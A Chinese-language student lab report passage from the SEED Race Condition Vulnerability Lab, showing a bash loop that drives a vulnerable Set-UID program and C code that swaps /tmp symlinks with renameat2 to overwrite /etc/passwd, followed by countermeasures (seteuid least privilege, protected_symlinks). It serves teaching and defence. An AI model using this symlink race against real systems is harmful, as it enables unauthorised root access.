<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>CHECK_FILE=&quot;ls -l /etc/passwd&quot;<br>old=$($CHECK_FILE)<br>new=$($CHECK_FILE)<br>while [ &quot;$old&quot; == &quot;$new&quot; ] Ù Check if /etc/passwd is modified<br>do<br>    echo &quot;your input&quot; | ./vulp Ù Run the vulnerable program<br>    new=$($CHECK_FILE)<br>done<br>echo &quot;STOP... The passwd file has been changed&quot;<br></code></pre></div></td></tr></table></figure>
<h4 id="实验操作-5"><a href="#实验操作-5" class="headerlink" title="实验操作"></a>实验操作</h4><ol>
<li><p>编译并运行<code>attack_process.c</code></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204402355.png" srcset="/img/loading.gif" lazyload alt="image-20211211204402355"></p>
</li>
<li><p>更改<code>target_process.sh</code>中的输入部分：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204607627.png" srcset="/img/loading.gif" lazyload alt="image-20211211204607627"></p>
</li>
<li><p>执行脚本<code>target_process.sh</code>，开始攻击：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204649657.png" srcset="/img/loading.gif" lazyload alt="image-20211211204649657">    </p>
<div class="hljs code-wrapper"><pre><code class="hljs"> ### 验证成功
</code></pre></div></li>
</ol>
<p>​        当脚本终止时，通过以测试用户身份登录并验证root权限来测试利用漏洞的成功性。然后在启动程序的终端窗口中按Ctrl-C键终止攻击程序。</p>
<h4 id="实验操作-6"><a href="#实验操作-6" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204814280.png" srcset="/img/loading.gif" lazyload alt="image-20211211204814280"></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204938452.png" srcset="/img/loading.gif" lazyload alt="image-20211211204938452"><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204959569.png" srcset="/img/loading.gif" lazyload alt="image-20211211204959569"></p>
<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>​        如果10分钟后，您的攻击仍未成功，则可以停止攻击，并检查<code>/tmp/XYZ</code>文件的所有权。如果此文件的所有者成为root用户，请手动删除此文件，然后重试攻击，直到攻击成功。请在实验室报告中记录这一观察结果。在任务2.C中，我们将解释原因并提供一种改进的攻击方法。</p>
<h3 id="4-3任务2-C：一种改进的攻击方法"><a href="#4-3任务2-C：一种改进的攻击方法" class="headerlink" title="4.3任务2.C：一种改进的攻击方法"></a>4.3任务2.C：一种改进的攻击方法</h3><p>​        在任务 2.B 中，如果您已正确完成所有操作，但仍无法成功攻击，请检查 <code>/tmp/XYZ</code> 的所有权。 您会发现 <code>/tmp/XYZ</code> 的所有者已成为 root（通常应该是seed）。 如果发生这种情况，您的攻击将永远不会成功，因为您的攻击程序以seed的权限运行，无法再删除或<code>unlink()</code>它。 这是因为 <code>/tmp</code> 文件夹有一个“粘性”位，这意味着只有文件的所有者才能删除该文件，即使该文件夹是全局可写的。<br>​        在任务 2.B 中，我们让您使用 root 的权限删除 <code>/tmp/XYZ</code>，然后再次尝试您的攻击。而不希望的情况随机发生，因此通过重复攻击（在 root 的“帮助”下），您最终将在任务 2.B 中取得成功。 显然，从 root 获取帮助并不是真正的攻击。 我们想摆脱它，并在没有 root 帮助的情况下做到这一点。<br>​        这种不良情况的主要原因是我们的攻击程序有问题，竞争条件问题，正是我们试图在受害者程序中利用的问题。 （真讽刺！）<br>​        攻击程序在删除 <code>/tmp/XYZ</code>（即 unlink()）之后，而在将名称链接到另一个文件（即 <code>symlink()</code>）之前立即切换上下文。删除现有符号链接并创建新符号链接的操作不是原子性的（它涉及两个单独的系统调用）。因此，如果上下文切换发生在中间（即在删除 <code>/tmp/XYZ</code> 之后），并且目标 Set-UID 程序有机会运行其 <code>fopen(fn, &quot;a+&quot;)</code>语句，它将创建一个以 root 为所有者的新文件。 之后，您的攻击程序将无法再更改 <code>/tmp/XYZ</code>。<br>​        基本上，使用 <code>unlink()</code> 和 <code>symlink()</code> 方法，我们的攻击程序中存在竞争条件。因此，当我们试图利用目标程序中的竞争条件时，目标程序可能会意外地“利用”我们攻击程序中的竞争条件，从而击败我们的攻击。<br>​        为了解决这个问题，我们需要使 <code>unlink()</code> 和 <code>symlink()</code> 原子化。 幸运的是，有一个系统调用可以让我们实现这一点。 更准确地说，它允许我们原子地交换两个符号链接。 下面的程序首先创建两个符号链接 <code>/tmp/XYZ</code> 和 <code>/tmp/ABC</code>，然后使用 <code>renameat2</code> 系统调用来原子地切换它们。 这允许我们在不引入任何竞争条件的情况下更改 <code>/tmp/XYZ</code> 指向的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = RENAME_EXCHANGE;<br>    unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>    unlink(<span class="hljs-string">&quot;/tmp/ABC&quot;</span>); symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>);<br>    renameat2(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>, flags);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></div></td></tr></table></figure>
<p><strong>任务</strong>：请使用此新策略修改您的攻击程序，然后再次尝试您的攻击。 如果一切都正确完成，您的攻击应该能够成功。</p>
<h4 id="实验操作-7"><a href="#实验操作-7" class="headerlink" title="实验操作"></a>实验操作</h4><ol>
<li><p>更改<code>attack_process.c</code>如下，编译并运行<code>attack_process.c</code></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211211310806.png" srcset="/img/loading.gif" lazyload alt="image-20211211211310806"></p>
</li>
<li><p>执行脚本<code>target_process.sh</code>，开始攻击：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211211414604.png" srcset="/img/loading.gif" lazyload alt="image-20211211211414604"></p>
</li>
<li><p>攻击成功：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213612436.png" srcset="/img/loading.gif" lazyload alt="image-20211211213612436"></p>
</li>
</ol>
<h2 id="5-任务-3：关于对策"><a href="#5-任务-3：关于对策" class="headerlink" title="5 任务 3：关于对策"></a>5 任务 3：关于对策</h2><h2 id="5-1-任务-3-A：应用最小权限原则"><a href="#5-1-任务-3-A：应用最小权限原则" class="headerlink" title="5.1 任务 3.A：应用最小权限原则"></a>5.1 任务 3.A：应用最小权限原则</h2><p>​        本实验室易受攻击程序的根本问题是违反最小权限原则。 程序员确实明白运行程序的用户可能太强大了，所以他/她引入了 access() 来限制用户的权力。 然而，这不是正确的方法。 更好的方法是应用最小权限原则； 即，如果用户不需要某些权限，则需要禁用该权限。        我们可以使用 <code>seteuid</code> 系统调用暂时禁用 root 权限，然后在必要时启用它。<br>​        请使用此方法修复程序中的漏洞，然后重复您的攻击。 你能成功吗？ 请报告您的观察并提供解释。暂时关闭root权限</p>
<h3 id="实验操作-8"><a href="#实验操作-8" class="headerlink" title="实验操作"></a>实验操作</h3><ol>
<li><p>更改<code>vulp.c</code>如下，重新编译，设置为root所有的<code>setuid</code>程序：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213724915.png" srcset="/img/loading.gif" lazyload alt="image-20211211213724915"></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213859715.png" srcset="/img/loading.gif" lazyload alt="image-20211211213859715"></p>
</li>
<li><p>按照任务2.C的操作进行攻击：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214035163.png" srcset="/img/loading.gif" lazyload alt="image-20211211214035163"></p>
<ul>
<li>无法成功</li>
</ul>
</li>
<li><p>原因：调用open()时没有root权限打开<code>/tmp/X</code>指向的受保护的文件<code>passwd</code>。</p>
</li>
</ol>
<h2 id="5-2-任务-3-B：使用-Ubuntu-的内置方案"><a href="#5-2-任务-3-B：使用-Ubuntu-的内置方案" class="headerlink" title="5.2 任务 3.B：使用 Ubuntu 的内置方案"></a>5.2 任务 3.B：使用 Ubuntu 的内置方案</h2><p>​        Ubuntu 10.10 和更高版本带有一个内置的保护方案，可以防止竞争条件攻击。 在此任务中，您需要使用以下命令重新打开保护：</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">// On Ubuntu 16.04 and 20.04, use the following command: <br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -w fs.protected_symlinks=1</span><br></code></pre></div></td></tr></table></figure>
<p>​        在保护开启后进行攻击。 请描述您的观察。 请同时解释以下内容： (1) 该保护方案是如何运作的？  (2) 该方案的局限性是什么？</p>
<h3 id="实验操作-9"><a href="#实验操作-9" class="headerlink" title="实验操作"></a>实验操作</h3><ol>
<li><p>打开保护：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214522375.png" srcset="/img/loading.gif" lazyload alt="image-20211211214522375"></p>
</li>
<li><p>使用任务2的<code>vulp.c</code>，重新攻击：</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214611103.png" srcset="/img/loading.gif" lazyload alt="image-20211211214611103"></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214644501.png" srcset="/img/loading.gif" lazyload alt="image-20211211214644501"></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214706604.png" srcset="/img/loading.gif" lazyload alt="image-20211211214706604"></p>
<ul>
<li>攻击失败</li>
</ul>
</li>
<li><p>原因：当设置粘滞位比特后，只有文件所有者、目录所有者或root用户才能重命名或删除粘滞目录中的文件。<code>/tmp</code>目录设置了粘滞位比特。当粘滞符号保护开启后，全局可写的粘滞目录（如<code>tmp</code>）中的符号链接的所有者，与跟随者和目录所有者的其中之一相匹配时才能被跟随。</p>
<p>本次竞态条件攻击中，漏洞程序以root权限运行，即跟随者为root，<code>/tmp</code>目录的所有者也是root，但是符号链接所有者时攻击者本身（seed）。所以系统不允许程序使用该符号链接。</p>
<p>局限性：仅适用于<code>/tmp</code>这样的粘滞目录。</p>
</li>
</ol>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">软件安全实验</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">软件安全实验</a>
                    
                      <a class="hover-with-bg" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA/">计算机安全导论</a>
                    
                      <a class="hover-with-bg" href="/tags/SeedUbuntu/">SeedUbuntu</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均为博客作者本人编写整理，转载请联系作者！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/12/29/Allocation_and_recycling_of_main_storage_space/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">主存储器空间的分配和回收的C++实现</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">
                        <span class="hidden-mobile">Format String Attack Lab</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"gI9ZupcpBXTdxJvxZZrrxydJ-gzGzoHsz","appKey":"Eew9XWCbMWVcoNrQzrg87EP3","path":"window.location.pathname","placeholder":"说点什么","avatar":"mp","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":"trut","recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="" target="_blank" rel="nofollow noopener"><span>Copyrights © 2021 Yuhan</span></a> <i class="iconfont icon-love"></i> <a href="" target="_blank" rel="nofollow noopener"><span>Xiayan</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js" ></script>
  
  
    <script  src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>





  

  
    <!-- KaTeX -->
    <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.15.3/katex.min.css" />
  








  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?6da93a2e5d7f160e0f40b273ddbbddac";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
